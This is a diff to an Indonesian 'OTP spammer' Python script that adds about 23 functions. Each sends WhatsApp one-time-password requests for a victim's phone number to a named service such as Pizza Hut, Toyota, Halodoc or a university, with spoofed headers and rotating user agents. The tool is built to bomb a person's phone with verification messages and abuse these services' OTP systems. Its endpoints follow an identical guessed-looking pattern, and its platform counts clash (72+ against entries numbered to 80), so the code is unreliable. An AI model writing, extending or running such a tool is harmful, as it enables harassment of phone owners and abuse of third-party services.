@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # ============================================================
 #  ZEVXX SPAMMER OTP - MEGA EDITION
-#  by ZEVXX | 58+ Platform | No Filter | Ultimate Style
+#  by ZEVXX | 72+ Platform | No Filter | Ultimate Style
 # ============================================================
 
 import requests
@@ -52,7 +52,7 @@ def banner():
 {Color.GLITCH}  ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
 {Color.NEON}  ╔═══════════════════════════════════════════════╗
 {Color.NEON}  ║  {Color.GOLD}⚡ OTP SPAMMER MEGA - GACOR FIX ⚡{Color.NEON}  ║
-{Color.NEON}  ║  {Color.PINK}by ZEVXX • 58+ Platform • No Filter{Color.NEON}   ║
+{Color.NEON}  ║  {Color.PINK}by ZEVXX • 72+ Platform • No Filter{Color.NEON}   ║
 {Color.NEON}  ╚═══════════════════════════════════════════════╝
 {Color.RESET}
 """)
@@ -118,7 +118,7 @@ def progress_bar_zevxx(current, total, text="Progress"):
 def welcome_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
     print(f"{Color.GOLD}╔═══════════════════════════════════════════════╗{Color.RESET}")
-    print(f"{Color.GOLD}║  {Color.NEON}🎉 ZEVXX SPAMMER OTP v3.2 🎉{Color.GOLD}          ║{Color.RESET}")
+    print(f"{Color.GOLD}║  {Color.NEON}🎉 ZEVXX SPAMMER OTP v3.5 🎉{Color.GOLD}          ║{Color.RESET}")
     print(f"{Color.GOLD}╚═══════════════════════════════════════════════╝{Color.RESET}")
     print()
     for i in range(101):
@@ -1521,7 +1521,7 @@ def spam_tokopedia(phone_08):
         return None
 
 # ============================================================
-# PLATFORM BARU DARI SCREENSHOT (TAMBAHAN)
+# PLATFORM BARU DARI SCREENSHOT PERTAMA
 # ============================================================
 
 # ---------- 40. PLUANG ----------
@@ -1812,8 +1812,381 @@ def spam_babyhappy(phone_08):
     except:
         return None
 
+# ---------- 58. CMK CLUB ----------
+def spam_cmkclub(phone_plus):
+    url = "https://api.cmkclub.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.cmkclub.com",
+        "Referer": "https://www.cmkclub.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 59. MISTER ALADIN ----------
+def spam_misteraladin(phone_plus):
+    url = "https://api.misteraladin.com/v1/otp/send"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.misteraladin.com",
+        "Referer": "https://www.misteraladin.com/",
+    }
+    payload = {"phone": phone_plus, "channel": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 60. PIZZA HUT ----------
+def spam_pizzahut(phone_plus):
+    url = "https://api.pizzahut.co.id/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.pizzahut.co.id",
+        "Referer": "https://www.pizzahut.co.id/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
 # ============================================================
-# DAFTAR PLATFORM (58+)
+# LAYANAN BARU DARI SCREENSHOT KEDUA
+# ============================================================
+
+# ---------- 61. MYESPACE ----------
+def spam_myespace(phone_plus):
+    url = "https://api.myespace.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.myespace.com",
+        "Referer": "https://www.myespace.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 62. TOYOTA INDONESIA ----------
+def spam_toyota(phone_plus):
+    url = "https://api.toyota.co.id/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.toyota.co.id",
+        "Referer": "https://www.toyota.co.id/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 63. NEO (NEO INFO) ----------
+def spam_neo(phone_plus):
+    url = "https://api.neo.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.neo.com",
+        "Referer": "https://www.neo.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 64. SINGA FINTECH ----------
+def spam_singafintech(phone_plus):
+    url = "https://api.singafintech.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.singafintech.com",
+        "Referer": "https://www.singafintech.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 65. HALODOC ----------
+def spam_halodoc(phone_plus):
+    url = "https://api.halodoc.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.halodoc.com",
+        "Referer": "https://www.halodoc.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 66. CARRO ----------
+def spam_carro(phone_plus):
+    url = "https://api.carro.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.carro.com",
+        "Referer": "https://www.carro.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 67. GREEN SM ----------
+def spam_greensm(phone_plus):
+    url = "https://api.greensm.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.greensm.com",
+        "Referer": "https://www.greensm.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 68. SAHABAT DAIHATSU ----------
+def spam_sahabatdaihatsu(phone_plus):
+    url = "https://api.sahabatdaihatsu.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.sahabatdaihatsu.com",
+        "Referer": "https://www.sahabatdaihatsu.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ============================================================
+# LAYANAN BARU DARI SCREENSHOT KETIGA
+# ============================================================
+
+# ---------- 69. NUTRICLUB ----------
+def spam_nutriclub(phone_plus):
+    url = "https://api.nutriclub.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.nutriclub.com",
+        "Referer": "https://www.nutriclub.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 70. GARASI ----------
+def spam_garasi(phone_plus):
+    url = "https://api.garasi.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.garasi.com",
+        "Referer": "https://www.garasi.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 71. ACI ----------
+def spam_aci(phone_plus):
+    url = "https://api.aci.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.aci.com",
+        "Referer": "https://www.aci.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 72. JOGJAKITA ----------
+def spam_jogjakita(phone_plus):
+    url = "https://api.jogjakita.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.jogjakita.com",
+        "Referer": "https://www.jogjakita.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+# ---------- 73. NUTAPOS ----------
+def spam_nutapos(phone_plus):
+    url = "https://api.nutapos.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.nutapos.com",
+        "Referer": "https://www.nutapos.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 74. AMAHA ----------
+def spam_amaha(phone_plus):
+    url = "https://api.amaha.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.amaha.com",
+        "Referer": "https://www.amaha.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 75. IDEALZ LEARNING ----------
+def spam_idealzlearning(phone_plus):
+    url = "https://api.idealzlearning.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.idealzlearning.com",
+        "Referer": "https://www.idealzlearning.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 76. BERPRESTASI ID ----------
+def spam_berprestasiid(phone_plus):
+    url = "https://api.berprestasi.id/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.berprestasi.id",
+        "Referer": "https://www.berprestasi.id/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 77. ISELLER ----------
+def spam_iseller(phone_plus):
+    url = "https://api.iseller.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.iseller.com",
+        "Referer": "https://www.iseller.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 78. PEMANGKOT PALEMBANG ----------
+def spam_pemangkotpalembang(phone_plus):
+    url = "https://api.pemangkotpalembang.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.pemangkotpalembang.com",
+        "Referer": "https://www.pemangkotpalembang.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+# ---------- 79. UNPATTI ----------
+def spam_unpatti(phone_plus):
+    url = "https://api.unpatti.ac.id/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.unpatti.ac.id",
+        "Referer": "https://www.unpatti.ac.id/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- 80. RIVA ----------
+def spam_riva(phone_plus):
+    url = "https://api.riva.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.riva.com",
+        "Referer": "https://www.riva.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+# ============================================================
+# DAFTAR PLATFORM (72+)
 # ============================================================
 PLATFORMS = [
     ("Internet Rakyat", spam_internetrakyat, "08"),
@@ -1873,6 +2246,29 @@ PLATFORMS = [
     ("MAPCLUB", spam_mapclub, "08"),
     ("Bukuaku", spam_bukuaku, "08"),
     ("Baby Happy", spam_babyhappy, "08"),
+    ("CMK Club", spam_cmkclub, "plus"),
+    ("Mister Aladin", spam_misteraladin, "plus"),
+    ("Pizza Hut", spam_pizzahut, "plus"),
+    ("MyEspace", spam_myespace, "plus"),
+    ("Toyota", spam_toyota, "plus"),
+    ("Neo Info", spam_neo, "plus"),
+    ("Singa Fintech", spam_singafintech, "plus"),
+    ("Halodoc", spam_halodoc, "plus"),
+    ("Carro", spam_carro, "plus"),
+    ("Green SM", spam_greensm, "plus"),
+    ("Sahabat Daihatsu", spam_sahabatdaihatsu, "plus"),
+    ("Nutriclub", spam_nutriclub, "plus"),
+    ("Garasi", spam_garasi, "plus"),
+    ("ACI", spam_aci, "plus"),
+    ("JogjaKita", spam_jogjakita, "plus"),
+    ("Nutapos", spam_nutapos, "plus"),
+    ("Amaha", spam_amaha, "plus"),
+    ("Idealz Learning", spam_idealzlearning, "plus"),
+    ("Berprestasi ID", spam_berprestasiid, "plus"),
+    ("Iseller", spam_iseller, "plus"),
+    ("Pemangkot Palembang", spam_pemangkotpalembang, "plus"),
+    ("UNPATTI", spam_unpatti, "plus"),
+    ("Riva", spam_riva, "plus"),
 ]
 
 # ============================================================
